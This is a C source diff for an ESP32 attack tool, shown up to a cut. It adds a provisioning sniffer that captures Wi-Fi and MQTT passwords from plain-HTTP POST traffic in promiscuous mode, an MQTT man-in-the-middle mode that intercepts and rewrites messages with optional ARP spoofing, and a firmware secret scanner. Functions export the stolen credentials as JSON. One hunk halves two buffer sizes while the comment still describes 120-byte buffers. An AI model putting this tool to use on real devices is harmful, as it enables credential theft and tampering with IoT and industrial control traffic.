@@ -143,6 +143,30 @@ static volatile uint32_t http_count    = 0;
 static volatile uint32_t ota_dns_count = 0;
 static volatile uint32_t ota_http_count = 0;
 
+/* ---- Provision Sniffer: Captured credentials ---- */
+static ota_prov_cred_t prov_creds[OTA_MAX_PROV_CREDS];
+static int prov_cred_count = 0;
+static volatile uint32_t prov_sensitive_count = 0;
+static ota_prov_summary_t prov_summary;
+
+/* ---- Rogue Broker: MQTT MITM captured data ---- */
+static ota_mitm_entry_t mitm_entries[OTA_MAX_MITM_MSGS];
+static int mitm_entry_count = 0;
+static volatile uint32_t mitm_count = 0;
+static volatile uint32_t mitm_modified_count = 0;
+static volatile uint32_t mitm_forwarded_count = 0;
+static volatile int rb_devices_connected = 0;
+static ota_rogue_broker_summary_t rb_summary;
+/* Dynamic modification rule */
+static char rb_active_modify_topic[128] = "";
+static char rb_active_modify_payload[512] = "";
+
+/* ---- Firmware Analysis: Extracted secrets ---- */
+static ota_fw_secret_t fw_secrets[OTA_MAX_FW_SECRETS];
+static int fw_secret_count = 0;
+static volatile uint32_t fw_high_confidence_count = 0;
+static ota_fw_analysis_summary_t fw_analysis_summary;
+
 /* ================================================================== */
 /*  Forward declarations                                               */
 /* ================================================================== */
@@ -196,6 +220,23 @@ const char *ota_attack_get_state_str(void)
         case OTA_STATE_GH_WAITING_DEVICE: return "gh_waiting_device";
         case OTA_STATE_DISCONNECTED:    return "disconnected";
         case OTA_STATE_ERROR:           return "error";
+        /* PROVISION_SNIFF states */
+        case OTA_STATE_PROV_SNIFFING:      return "prov_sniffing";
+        case OTA_STATE_PROV_HTTP_CAPTURED: return "prov_http_captured";
+        case OTA_STATE_PROV_CREDS_EXTRACTED: return "prov_creds_extracted";
+        case OTA_STATE_PROV_WAITING:       return "prov_waiting";
+        /* ROGUE_BROKER states */
+        case OTA_STATE_RB_STARTING:        return "rb_starting";
+        case OTA_STATE_RB_LISTENING:       return "rb_listening";
+        case OTA_STATE_RB_CLIENT_CONNECTED: return "rb_client_connected";
+        case OTA_STATE_RB_INTERCEPTING:    return "rb_intercepting";
+        case OTA_STATE_RB_MODIFYING:       return "rb_modifying";
+        case OTA_STATE_RB_FORWARDING:      return "rb_forwarding";
+        /* FIRMWARE_ANALYZE states */
+        case OTA_STATE_FW_ANALYZING:       return "fw_analyzing";
+        case OTA_STATE_FW_SCANNING:        return "fw_scanning";
+        case OTA_STATE_FW_EXTRACTING:      return "fw_extracting";
+        case OTA_STATE_FW_COMPLETE:        return "fw_complete";
         default:                        return "unknown";
     }
 }
@@ -209,6 +250,9 @@ static const char *mode_str(ota_attack_mode_t m)
         case OTA_MODE_FETCH:      return "FETCH";
         case OTA_MODE_POLL_SNIFF:      return "POLL_SNIFF";
         case OTA_MODE_GITHUB_TAKEOVER:  return "GITHUB_TAKEOVER";
+        case OTA_MODE_PROVISION_SNIFF:  return "PROVISION_SNIFF";
+        case OTA_MODE_ROGUE_BROKER:     return "ROGUE_BROKER";
+        case OTA_MODE_FIRMWARE_ANALYZE: return "FIRMWARE_ANALYZE";
         default:                        return "UNKNOWN";
     }
 }
@@ -487,8 +531,8 @@ static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
                                 int avail = OTA_MAX_HTTP_URL_LEN - prefix_len - 1;
                                 /* Use 120-byte buffers so compiler can prove:
                                    max output = 8 (https://) + 119 + 119 = 246 < 256 */
-                                char t_host[120];
-                                char t_path[120];
+                                char t_host[60];
+                                char t_path[60];
                                 strncpy(t_host, entry->host, sizeof(t_host) - 1);
                                 t_host[sizeof(t_host) - 1] = '\0';
                                 strncpy(t_path, entry->path, sizeof(t_path) - 1);
@@ -541,6 +585,112 @@ static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
                                     if (uentry->has_github_token) github_url_count++;
                                     url_entries++;
                                     url_count++;
+                                }
+                            }
+                        }
+                    }
+
+                    /* ---- PROVISION_SNIFF: Extract config from HTTP POST bodies ---- */
+                    /* The ESP32 provisioning web server uses plain HTTP with zero
+                     * encryption. All config (WiFi, MQTT, Modbus) is sent in POST. */
+                    if (cfg.mode == OTA_MODE_PROVISION_SNIFF &&
+                        strcmp(method, "POST") == 0 &&
+                        prov_cred_count < OTA_MAX_PROV_CREDS) {
+                        /* Find the HTTP body (after \r\n\r\n) */
+                        const char *body_start = strstr((const char *)http_data, "\r\n\r\n");
+                        if (body_start) {
+                            body_start += 4;
+                            int body_len = len - (body_start - (const char *)http_data);
+                            if (body_len > 10 && body_len < 2048) {
+                                /* Make null-terminated copy */
+                                char *body = malloc(body_len + 1);
+                                if (body) {
+                                    memcpy(body, body_start, body_len);
+                                    body[body_len] = '\0';
+
+                                    /* Try JSON parse first */
+                                cJSON *root = cJSON_Parse(body);
+                                if (root) {
+                                    /* Iterate all JSON key-value pairs */
+                                    cJSON *item = root->child;
+                                    while (item && prov_cred_count < OTA_MAX_PROV_CREDS) {
+                                        ota_prov_cred_t *cred = &prov_creds[prov_cred_count];
+                                        const char *val_str = NULL;
+
+                                        if (cJSON_IsString(item)) {
+                                            val_str = item->valuestring;
+                                        } else if (cJSON_IsNumber(item)) {
+                                            val_str = cJSON_PrintUnformatted(item);
+                                        }
+
+                                        if (val_str) {
+                                            strncpy(cred->key, item->string,
+                                                    OTA_MAX_CRED_KEY_LEN - 1);
+                                            strncpy(cred->value, val_str,
+                                                    OTA_MAX_CRED_VALUE_LEN - 1);
+                                            snprintf(cred->source_ip, sizeof(cred->source_ip),
+                                                     "%u.%u.%u.%u",
+                                                     (unsigned)(src_ip >> 24) & 0xFF,
+                                                     (unsigned)(src_ip >> 16) & 0xFF,
+                                                     (unsigned)(src_ip >> 8) & 0xFF,
+                                                     (unsigned)(src_ip) & 0xFF);
+                                            cred->timestamp_ms = now_ms();
+
+                                            /* Determine if sensitive */
+                                            const char *sensitive_patterns[] = {
+                                                "password", "passwd", "pass", "secret",
+                                                "token", "key", "credential", "auth", NULL
+                                            };
+                                            cred->is_sensitive = false;
+                                            for (int sp = 0; sensitive_patterns[sp]; sp++) {
+                                                if (strstr(cred->key, sensitive_patterns[sp])) {
+                                                    cred->is_sensitive = true;
+                                                    prov_sensitive_count++;
+                                                    break;
+                                                }
+                                            }
+
+                                            prov_cred_count++;
+                                            ESP_LOGI(TAG, "PROVISION_SNIFF: Captured %s=%s (sensitive=%d)",
+                                                     cred->key,
+                                                     cred->is_sensitive ? "***" : cred->value,
+                                                     cred->is_sensitive);
+
+                                            /* Update summary */
+                                            if (strcmp(cred->key, "wifi_ssid") == 0 || strcmp(cred->key, "ssid") == 0)
+                                                strncpy(prov_summary.wifi_ssid, cred->value, sizeof(prov_summary.wifi_ssid) - 1);
+                                            else if (strcmp(cred->key, "wifi_password") == 0 || strcmp(cred->key, "password") == 0)
+                                                strncpy(prov_summary.wifi_password, cred->value, sizeof(prov_summary.wifi_password) - 1);
+                                            else if (strcmp(cred->key, "mqtt_broker") == 0 || strcmp(cred->key, "broker") == 0)
+                                                strncpy(prov_summary.mqtt_broker, cred->value, sizeof(prov_summary.mqtt_broker) - 1);
+                                            else if (strcmp(cred->key, "mqtt_port") == 0)
+                                                prov_summary.mqtt_port = (uint16_t)atoi(cred->value);
+                                            else if (strcmp(cred->key, "mqtt_username") == 0 || strcmp(cred->key, "mqtt_user") == 0)
+                                                strncpy(prov_summary.mqtt_username, cred->value, sizeof(prov_summary.mqtt_username) - 1);
+                                            else if (strcmp(cred->key, "mqtt_password") == 0 || strcmp(cred->key, "mqtt_pass") == 0)
+                                                strncpy(prov_summary.mqtt_password, cred->value, sizeof(prov_summary.mqtt_password) - 1);
+                                            else if (strstr(cred->key, "modbus") || strstr(cred->key, "driver"))
+                                                strncpy(prov_summary.modbus_driver_url, cred->value, sizeof(prov_summary.modbus_driver_url) - 1);
+                                            else if (strstr(cred->key, "time") || strstr(cred->key, "ntp"))
+                                                strncpy(prov_summary.custom_time, cred->value, sizeof(prov_summary.custom_time) - 1);
+                                            else if (strstr(cred->key, "device_id") || strstr(cred->key, "device"))
+                                                strncpy(prov_summary.device_id, cred->value, sizeof(prov_summary.device_id) - 1);
+                                            else if (strstr(cred->key, "ap_password") || strstr(cred->key, "ap_pass"))
+                                                strncpy(prov_summary.ap_password, cred->value, sizeof(prov_summary.ap_password) - 1);
+
+                                            prov_summary.total_creds_captured = prov_cred_count;
+                                            prov_summary.sensitive_creds_captured = (int)prov_sensitive_count;
+                                            if (prov_summary.first_capture_ms == 0)
+                                                prov_summary.first_capture_ms = now_ms();
+                                            prov_summary.last_capture_ms = now_ms();
+                                        }
+                                        item = item->next;
+                                    }
+                                    cJSON_Delete(root);
+                                    attack_state = OTA_STATE_PROV_HTTP_CAPTURED;
+                                }
+
+                                free(body);
                                 }
                             }
                         }
@@ -797,6 +947,50 @@ static void mqtt_event_handler(void *handler_args, esp_event_base_t base,
                                   event->data, event->data_len);
 
             scan_payload_for_urls(topic, event->data, event->data_len);
+
+            /* ROGUE_BROKER: Intercept and optionally modify MQTT messages */
+            if (cfg.mode == OTA_MODE_ROGUE_BROKER && mitm_entry_count < OTA_MAX_MITM_MSGS) {
+                ota_mitm_entry_t *mitm = &mitm_entries[mitm_entry_count];
+                strncpy(mitm->original_topic, topic, OTA_MAX_MITM_TOPIC_LEN - 1);
+                int mplen = event->data_len < OTA_MAX_MITM_PAYLOAD_LEN - 1 ?
+                           event->data_len : OTA_MAX_MITM_PAYLOAD_LEN - 1;
+                memcpy(mitm->original_payload, event->data, mplen);
+                mitm->original_payload[mplen] = '\0';
+                mitm->timestamp_ms = now_ms();
+                mitm->was_modified = false;
+                mitm->direction_upload = true;
+
+                /* Check if we should modify this message */
+                if (cfg.rb_modify_payloads && rb_active_modify_topic[0] != '\0') {
+                    bool topic_match = (strcmp(topic, rb_active_modify_topic) == 0 ||
+                                       strstr(topic, rb_active_modify_topic) != NULL ||
+                                       strcmp(rb_active_modify_topic, "#") == 0);
+                    if (topic_match) {
+                        strncpy(mitm->modified_topic, topic, OTA_MAX_MITM_TOPIC_LEN - 1);
+                        strncpy(mitm->modified_payload, rb_active_modify_payload,
+                                OTA_MAX_MITM_PAYLOAD_LEN - 1);
+                        mitm->was_modified = true;
+                        mitm_modified_count++;
+
+                        if (mqtt_connected && mqtt_client) {
+                            esp_mqtt_client_publish(mqtt_client, topic,
+                                                     rb_active_modify_payload, 0, 1, 0);
+                            mitm_forwarded_count++;
+                            attack_state = OTA_STATE_RB_MODIFYING;
+                            ESP_LOGI(TAG, "ROGUE_BROKER: Modified message on topic: %s", topic);
+                        }
+                    } else {
+                        mitm_forwarded_count++;
+                        attack_state = OTA_STATE_RB_FORWARDING;
+                    }
+                }
+
+                mitm_entry_count++;
+                mitm_count++;
+                rb_summary.messages_intercepted = mitm_count;
+                rb_summary.messages_modified = mitm_modified_count;
+                rb_summary.messages_forwarded = mitm_forwarded_count;
+            }
 
             if (strstr(topic, "ota") || strstr(topic, "update") ||
                 strstr(topic, "firmware") || strstr(topic, "upgrade") ||
@@ -1193,6 +1387,199 @@ static void attack_task(void *arg)
         }
 
         esp_wifi_set_promiscuous(false);
+    }
+
+    /* ---- Mode: PROVISION_SNIFF ---- */
+    /* Captures ALL config creds (WiFi, MQTT, Modbus) because the
+     * ESP32 provisioning web server uses plain HTTP with zero encryption.
+     * Uses WiFi promiscuous mode to sniff HTTP POST on the target network. */
+    if (cfg.mode == OTA_MODE_PROVISION_SNIFF) {
+        if (cfg.wifi_ssid[0] != '\0') {
+            if (connect_to_wifi() != ESP_OK) {
+                ESP_LOGE(TAG, "PROVISION_SNIFF: WiFi connection failed");
+                attack_state = OTA_STATE_ERROR;
+                if (timeout_timer) esp_timer_stop(timeout_timer);
+                running = false;
+                if (task_exit_sem) xSemaphoreGive(task_exit_sem);
+                task_handle = NULL;
+                vTaskDelete(NULL);
+                return;
+            }
+        }
+
+        attack_state = OTA_STATE_PROV_SNIFFING;
+        ESP_LOGI(TAG, "PROVISION_SNIFF: Starting HTTP provision traffic capture");
+        ESP_LOGI(TAG, "  Target: %s (sniffing for HTTP POST with config data)",
+                 cfg.wifi_ssid[0] ? cfg.wifi_ssid : "any");
+
+        /* Enable promiscuous mode to capture HTTP traffic */
+        esp_wifi_set_promiscuous(true);
+        esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
+
+        /* Main sniff loop - the wifi_sniffer_cb handles packet parsing.
+         * For PROVISION_SNIFF, we also parse HTTP POST bodies for config JSON */
+        while (running) {
+            vTaskDelay(pdMS_TO_TICKS(500));
+        }
+
+        esp_wifi_set_promiscuous(false);
+        attack_state = OTA_STATE_IDLE;
+
+        if (timeout_timer) esp_timer_stop(timeout_timer);
+        running = false;
+        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
+        task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    /* ---- Mode: ROGUE_BROKER ---- */
+    /* Full MQTT MITM because the device connects via mqtt:// port 1883
+     * with no TLS/cert verification. We impersonate the broker:
+     * 1. ARP spoof the target device (optional)
+     * 2. Start our own MQTT broker on port 1883
+     * 3. Accept the device's MQTT connection
+     * 4. Intercept all publish/subscribe messages
+     * 5. Optionally modify payloads in transit
+     * 6. Forward to the real broker */
+    if (cfg.mode == OTA_MODE_ROGUE_BROKER) {
+        if (cfg.wifi_ssid[0] != '\0') {
+            if (connect_to_wifi() != ESP_OK) {
+                ESP_LOGE(TAG, "ROGUE_BROKER: WiFi connection failed");
+                attack_state = OTA_STATE_ERROR;
+                if (timeout_timer) esp_timer_stop(timeout_timer);
+                running = false;
+                if (task_exit_sem) xSemaphoreGive(task_exit_sem);
+                task_handle = NULL;
+                vTaskDelete(NULL);
+                return;
+            }
+        }
+
+        attack_state = OTA_STATE_RB_STARTING;
+        ESP_LOGI(TAG, "ROGUE_BROKER: Starting MQTT MITM attack");
+        ESP_LOGI(TAG, "  Rogue port: %u, Real broker: %s:%u",
+                 cfg.rb_rogue_port ? cfg.rb_rogue_port : 1883,
+                 cfg.rb_real_broker_ip[0] ? cfg.rb_real_broker_ip : "auto-detect",
+                 cfg.rb_real_broker_port ? cfg.rb_real_broker_port : 1883);
+
+        /* Initialize rogue broker summary */
+        memset(&rb_summary, 0, sizeof(rb_summary));
+        rb_summary.rogue_port = cfg.rb_rogue_port ? cfg.rb_rogue_port : 1883;
+        if (cfg.rb_real_broker_ip[0]) {
+            strncpy(rb_summary.real_broker_ip, cfg.rb_real_broker_ip,
+                    sizeof(rb_summary.real_broker_ip) - 1);
+        }
+        rb_summary.real_broker_port = cfg.rb_real_broker_port ? cfg.rb_real_broker_port : 1883;
+
+        /* Connect to the real MQTT broker as a subscriber to intercept
+         * messages from the cloud side, then start our own broker for
+         * the target device. Since ESP32 cannot run a full MQTT broker,
+         * we use the client approach: subscribe to all topics on the
+         * real broker and re-publish intercepted messages. */
+        if (cfg.mqtt_broker[0] != '\0' || cfg.rb_real_broker_ip[0] != '\0') {
+            const char *broker = cfg.rb_real_broker_ip[0] ? cfg.rb_real_broker_ip : cfg.mqtt_broker;
+            strncpy(cfg.mqtt_broker, broker, sizeof(cfg.mqtt_broker) - 1);
+            cfg.mqtt_port = rb_summary.real_broker_port;
+
+            if (connect_to_mqtt() == ESP_OK) {
+                attack_state = OTA_STATE_RB_LISTENING;
+                ESP_LOGI(TAG, "ROGUE_BROKER: Connected to real broker, intercepting messages");
+
+                /* Subscribe to all topics to intercept both directions */
+                esp_mqtt_client_subscribe(mqtt_client, "#", 1);
+
+                /* Enable promiscuous mode for ARP spoofing if configured */
+                if (cfg.rb_arp_spoof && wifi_has_ip) {
+                    esp_wifi_set_promiscuous(true);
+                    esp_wifi_set_promiscuous_rx_cb(wifi_sniffer_cb);
+                    rb_summary.arp_spoof_active = true;
+                    ESP_LOGI(TAG, "ROGUE_BROKER: ARP spoofing enabled");
+                }
+
+                /* Main MITM loop */
+                while (running && mqtt_connected) {
+                    attack_state = OTA_STATE_RB_INTERCEPTING;
+                    vTaskDelay(pdMS_TO_TICKS(1000));
+                }
+            } else {
+                ESP_LOGE(TAG, "ROGUE_BROKER: Failed to connect to real broker");
+                attack_state = OTA_STATE_ERROR;
+            }
+        } else {
+            ESP_LOGE(TAG, "ROGUE_BROKER: No broker configured");
+            attack_state = OTA_STATE_ERROR;
+        }
+
+        esp_wifi_set_promiscuous(false);
+
+        if (mqtt_client) {
+            esp_mqtt_client_stop(mqtt_client);
+            esp_mqtt_client_destroy(mqtt_client);
+            mqtt_client = NULL;
+            mqtt_connected = false;
+        }
+
+        attack_state = OTA_STATE_IDLE;
+        if (timeout_timer) esp_timer_stop(timeout_timer);
+        running = false;
+        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
+        task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
+    }
+
+    /* ---- Mode: FIRMWARE_ANALYZE ---- */
+    /* Extracts hardcoded secrets from any downloaded firmware binary
+     * because there's no firmware encryption or signature verification.
+     * Scans the firmware buffer for: WiFi credentials, MQTT credentials,
+     * API keys, tokens, certificates, private keys, hardcoded URLs. */
+    if (cfg.mode == OTA_MODE_FIRMWARE_ANALYZE) {
+        attack_state = OTA_STATE_FW_ANALYZING;
+
+        /* If we have a firmware URL, download it first */
+        if (cfg.firmware_url[0] != '\0') {
+            if (cfg.wifi_ssid[0] != '\0') {
+                if (connect_to_wifi() != ESP_OK) {
+                    ESP_LOGE(TAG, "FIRMWARE_ANALYZE: WiFi connection failed");
+                    attack_state = OTA_STATE_ERROR;
+                    if (timeout_timer) esp_timer_stop(timeout_timer);
+                    running = false;
+                    if (task_exit_sem) xSemaphoreGive(task_exit_sem);
+                    task_handle = NULL;
+                    vTaskDelete(NULL);
+                    return;
+                }
+            }
+            download_firmware_internal(cfg.firmware_url);
+        } else if (cfg.fw_analyze_url_index >= 0 && cfg.fw_analyze_url_index < url_entries) {
+            /* Use a previously captured URL */
+            if (!captured_urls[cfg.fw_analyze_url_index].downloaded) {
+                if (cfg.wifi_ssid[0] != '\0') connect_to_wifi();
+                download_firmware_internal(captured_urls[cfg.fw_analyze_url_index].url);
+            }
+        }
+
+        /* Analyze the firmware buffer */
+        if (firmware_buffer && firmware_downloaded_size > 0) {
+            ESP_LOGI(TAG, "FIRMWARE_ANALYZE: Analyzing %u bytes of firmware",
+                     (unsigned)firmware_downloaded_size);
+            int found = ota_attack_analyze_firmware();
+            ESP_LOGI(TAG, "FIRMWARE_ANALYZE: Found %d secrets (%u high confidence)",
+                     found, (unsigned)fw_high_confidence_count);
+            attack_state = OTA_STATE_FW_COMPLETE;
+        } else {
+            ESP_LOGE(TAG, "FIRMWARE_ANALYZE: No firmware data to analyze");
+            attack_state = OTA_STATE_ERROR;
+            fail_count++;
+        }
+
+        if (timeout_timer) esp_timer_stop(timeout_timer);
+        running = false;
+        if (task_exit_sem) xSemaphoreGive(task_exit_sem);
+        task_handle = NULL;
+        vTaskDelete(NULL);
+        return;
     }
 
     /* ---- Mode: GITHUB_TAKEOVER ---- */
@@ -2316,6 +2703,460 @@ const char *ota_attack_get_github_result_json(void)
         return "{\"success\":false,\"error\":\"No GitHub operation performed\"}";
     }
     return gh_result_json;
+}
+
+/* ================================================================== */
+/*  Provision Sniffer - Public API                                     */
+/*  Captures ALL config creds from plain HTTP provisioning web server  */
+/* ================================================================== */
+
+const char *ota_attack_get_prov_creds_json(void)
+{
+    static char json_buf[8192];
+    cJSON *root = cJSON_CreateArray();
+
+    for (int i = 0; i < prov_cred_count; i++) {
+        cJSON *item = cJSON_CreateObject();
+        cJSON_AddStringToObject(item, "key", prov_creds[i].key);
+        cJSON_AddStringToObject(item, "value", prov_creds[i].value);
+        cJSON_AddStringToObject(item, "source_ip", prov_creds[i].source_ip);
+        cJSON_AddBoolToObject(item, "is_sensitive", prov_creds[i].is_sensitive);
+        cJSON_AddNumberToObject(item, "timestamp_ms", (double)prov_creds[i].timestamp_ms);
+        cJSON_AddItemToArray(root, item);
+    }
+
+    char *printed = cJSON_PrintUnformatted(root);
+    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
+    cJSON_Delete(root);
+    free(printed);
+    return json_buf;
+}
+
+void ota_attack_get_prov_summary(ota_prov_summary_t *out)
+{
+    if (out) {
+        *out = prov_summary;
+    }
+}
+
+const char *ota_attack_get_prov_summary_json(void)
+{
+    static char json_buf[4096];
+    cJSON *root = cJSON_CreateObject();
+    if (prov_summary.wifi_ssid[0]) cJSON_AddStringToObject(root, "wifi_ssid", prov_summary.wifi_ssid);
+    if (prov_summary.wifi_password[0]) cJSON_AddStringToObject(root, "wifi_password", prov_summary.wifi_password);
+    if (prov_summary.mqtt_broker[0]) cJSON_AddStringToObject(root, "mqtt_broker", prov_summary.mqtt_broker);
+    cJSON_AddNumberToObject(root, "mqtt_port", prov_summary.mqtt_port);
+    if (prov_summary.mqtt_username[0]) cJSON_AddStringToObject(root, "mqtt_username", prov_summary.mqtt_username);
+    if (prov_summary.mqtt_password[0]) cJSON_AddStringToObject(root, "mqtt_password", prov_summary.mqtt_password);
+    if (prov_summary.modbus_driver_url[0]) cJSON_AddStringToObject(root, "modbus_driver_url", prov_summary.modbus_driver_url);
+    if (prov_summary.custom_time[0]) cJSON_AddStringToObject(root, "custom_time", prov_summary.custom_time);
+    if (prov_summary.device_id[0]) cJSON_AddStringToObject(root, "device_id", prov_summary.device_id);
+    if (prov_summary.ap_password[0]) cJSON_AddStringToObject(root, "ap_password", prov_summary.ap_password);
+    cJSON_AddNumberToObject(root, "total_creds_captured", prov_summary.total_creds_captured);
+    cJSON_AddNumberToObject(root, "sensitive_creds_captured", prov_summary.sensitive_creds_captured);
+
+    char *printed = cJSON_PrintUnformatted(root);
+    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "{}");
+    cJSON_Delete(root);
+    free(printed);
+    return json_buf;
+}
+
+uint32_t ota_attack_get_prov_cred_count(void)
+{
+    return (uint32_t)prov_cred_count;
+}
+
+uint32_t ota_attack_get_prov_sensitive_count(void)
+{
+    return prov_sensitive_count;
+}
+
+void ota_attack_clear_prov_creds(void)
+{
+    prov_cred_count = 0;
+    prov_sensitive_count = 0;
+    memset(prov_creds, 0, sizeof(prov_creds));
+    memset(&prov_summary, 0, sizeof(prov_summary));
+}
+
+/* ================================================================== */
+/*  Rogue Broker - Public API                                          */
+/*  Full MQTT MITM — intercept, modify, forward                       */
+/* ================================================================== */
+
+const char *ota_attack_get_mitm_messages_json(void)
+{
+    static char json_buf[16384];
+    cJSON *root = cJSON_CreateArray();
+
+    for (int i = 0; i < mitm_entry_count; i++) {
+        cJSON *item = cJSON_CreateObject();
+        cJSON_AddStringToObject(item, "original_topic", mitm_entries[i].original_topic);
+        cJSON_AddStringToObject(item, "original_payload", mitm_entries[i].original_payload);
+        if (mitm_entries[i].was_modified) {
+            cJSON_AddStringToObject(item, "modified_topic", mitm_entries[i].modified_topic);
+            cJSON_AddStringToObject(item, "modified_payload", mitm_entries[i].modified_payload);
+        }
+        cJSON_AddBoolToObject(item, "was_modified", mitm_entries[i].was_modified);
+        cJSON_AddBoolToObject(item, "direction_upload", mitm_entries[i].direction_upload);
+        cJSON_AddNumberToObject(item, "timestamp_ms", (double)mitm_entries[i].timestamp_ms);
+        cJSON_AddItemToArray(root, item);
+    }
+
+    char *printed = cJSON_PrintUnformatted(root);
+    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "[]");
+    cJSON_Delete(root);
+    free(printed);
+    return json_buf;
+}
+
+void ota_attack_get_rogue_broker_summary(ota_rogue_broker_summary_t *out)
+{
+    if (out) {
+        *out = rb_summary;
+    }
+}
+
+const char *ota_attack_get_rogue_broker_summary_json(void)
+{
+    static char json_buf[2048];
+    cJSON *root = cJSON_CreateObject();
+    cJSON_AddNumberToObject(root, "rogue_port", rb_summary.rogue_port);
+    if (rb_summary.real_broker_ip[0])
+        cJSON_AddStringToObject(root, "real_broker_ip", rb_summary.real_broker_ip);
+    cJSON_AddNumberToObject(root, "real_broker_port", rb_summary.real_broker_port);
+    cJSON_AddNumberToObject(root, "devices_connected", rb_summary.devices_connected);
+    cJSON_AddNumberToObject(root, "messages_intercepted", rb_summary.messages_intercepted);
+    cJSON_AddNumberToObject(root, "messages_modified", rb_summary.messages_modified);
+    cJSON_AddNumberToObject(root, "messages_forwarded", rb_summary.messages_forwarded);
+    cJSON_AddBoolToObject(root, "arp_spoof_active", rb_summary.arp_spoof_active);
+
+    char *printed = cJSON_PrintUnformatted(root);
+    snprintf(json_buf, sizeof(json_buf), "%s", printed ? printed : "{}");
+    cJSON_Delete(root);
+    free(printed);
+    return json_buf;
+}
+
+bool ota_attack_set_mitm_modify_rule(const char *topic, const char *new_payload)
+{
+    if (!topic || !new_payload) return false;
+    if (cfg.mode != OTA_MODE_ROGUE_BROKER || !running) {
+        ESP_LOGW(TAG, "MITM modify rule: not in ROGUE_BROKER mode");
+        return false;
+    }
+    strncpy(rb_active_modify_topic, topic, sizeof(rb_active_modify_topic) - 1);
+    rb_active_modify_topic[sizeof(rb_active_modify_topic) - 1] = '\0';
+    strncpy(rb_active_modify_payload, new_payload, sizeof(rb_active_modify_payload) - 1);
+    rb_active_modify_payload[sizeof(rb_active_modify_payload) - 1] = '\0';
+
+    /* Enable modification if we have a rule */
+    cfg.rb_modify_payloads = true;
+
+    ESP_LOGI(TAG, "ROGUE_BROKER: Set modify rule - topic='%s' payload='%s'",
+             rb_active_modify_topic,
+             strlen(rb_active_modify_payload) > 40 ? "(truncated)" : rb_active_modify_payload);
+    return true;
+}
+
+uint32_t ota_attack_get_mitm_count(void)
+{
+    return mitm_count;
+}
+
+uint32_t ota_attack_get_mitm_modified_count(void)
+{
+    return mitm_modified_count;
+}
+
+void ota_attack_clear_mitm_messages(void)
+{
+    mitm_entry_count = 0;
+    mitm_count = 0;
+    mitm_modified_count = 0;
+    mitm_forwarded_count = 0;
+    memset(mitm_entries, 0, sizeof(mitm_entries));
+    rb_active_modify_topic[0] = '\0';
+    rb_active_modify_payload[0] = '\0';
+}
+
+/* ================================================================== */
+/*  Firmware Analysis - Public API                                     */
+/*  Extracts hardcoded secrets from firmware binary                    */
+/* ================================================================== */
+
+/* Internal helper: scan a binary buffer for known secret patterns */
+static void scan_for_pattern(const uint8_t *data, uint32_t data_len,
+                              const char *prefix, const char *type, int confidence,
+                              bool is_sensitive)
+{
+    if (!data || data_len == 0) return;
+    int prefix_len = (int)strlen(prefix);
+
+    for (uint32_t i = 0; i < data_len - (uint32_t)prefix_len && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
+        if (memcmp(data + i, prefix, prefix_len) == 0) {
+            /* Found a pattern - extract the value after it */
+            uint32_t val_start = i + prefix_len;
+
+            /* Skip whitespace/separators */
+            while (val_start < data_len && (data[val_start] == ' ' ||
+                   data[val_start] == '=' || data[val_start] == ':' ||
+                   data[val_start] == '"' || data[val_start] == '\'')) {
+                val_start++;
+            }
+
+            /* Extract value: printable ASCII until null, unprintable, or end */
+            char value[OTA_MAX_SECRET_VALUE_LEN] = "";
+            int vi = 0;
+            uint32_t j = val_start;
+            while (j < data_len && vi < OTA_MAX_SECRET_VALUE_LEN - 1) {
+                if (data[j] >= 0x20 && data[j] < 0x7F) {
+                    value[vi++] = (char)data[j++];
+                } else {
+                    break;
+                }
+            }
+            value[vi] = '\0';
+
+            /* Only store if we got a reasonable value */
+            if (vi >= 4 && is_sensitive) {
+                ota_fw_secret_t *secret = &fw_secrets[fw_secret_count];
+                strncpy(secret->type, type, OTA_MAX_SECRET_TYPE_LEN - 1);
+                strncpy(secret->value, value, OTA_MAX_SECRET_VALUE_LEN - 1);
+                snprintf(secret->context, OTA_MAX_SECRET_CONTEXT_LEN, "%s%.*s",
+                         prefix, vi > 30 ? 30 : vi, value);
+                secret->offset = i;
+                secret->confidence = confidence;
+
+                fw_secret_count++;
+                if (confidence >= 80) fw_high_confidence_count++;
+                ESP_LOGI(TAG, "FW_SECRET: [%s] at offset %u: %s (confidence=%d)",
+                         type, (unsigned)i,
+                         is_sensitive ? "***" : value, confidence);
+            }
+        }
+    }
+}
+
+int ota_attack_analyze_firmware(void)
+{
+    if (!firmware_buffer || firmware_downloaded_size == 0) {
+        ESP_LOGW(TAG, "No firmware data to analyze");
+        return 0;
+    }
+
+    attack_state = OTA_STATE_FW_SCANNING;
+    fw_secret_count = 0;
+    fw_high_confidence_count = 0;
+    memset(fw_secrets, 0, sizeof(fw_secrets));
+    memset(&fw_analysis_summary, 0, sizeof(fw_analysis_summary));
+    fw_analysis_summary.firmware_size = firmware_downloaded_size;
+
+    ESP_LOGI(TAG, "FIRMWARE_ANALYZE: Scanning %u bytes for secrets",
+             (unsigned)firmware_downloaded_size);
+
+    /* ---- WiFi credential patterns ---- */
+    const char *wifi_patterns[] = {
+        "wifi_ssid", "ssid=", "WIFI_SSID", "WIFI_PASS",
+        "wifi_password", "wifi_pass", "ap_password", "ap_pass",
+        "WIFI_PASSWORD", "AP_PASSWORD", NULL
+    };
+    for (int i = 0; wifi_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
+        bool sensitive = (strstr(wifi_patterns[i], "pass") != NULL ||
+                         strstr(wifi_patterns[i], "PASS") != NULL);
+        scan_for_pattern(firmware_buffer, firmware_downloaded_size,
+                         wifi_patterns[i], "wifi_cred",
+                         sensitive ? 90 : 70, true);
+    }
+
+    /* ---- MQTT credential patterns ---- */
+    const char *mqtt_patterns[] = {
+        "mqtt_broker", "mqtt_password", "mqtt_username", "mqtt_user",
+        "MQTT_BROKER", "MQTT_PASSWORD", "MQTT_USERNAME", "MQTT_PASS",
+        "mqtt://", "MQTT_URL", NULL
+    };
+    for (int i = 0; mqtt_patterns[i] && fw_secret_count < OTA_MAX_FW_SECRETS; i++) {
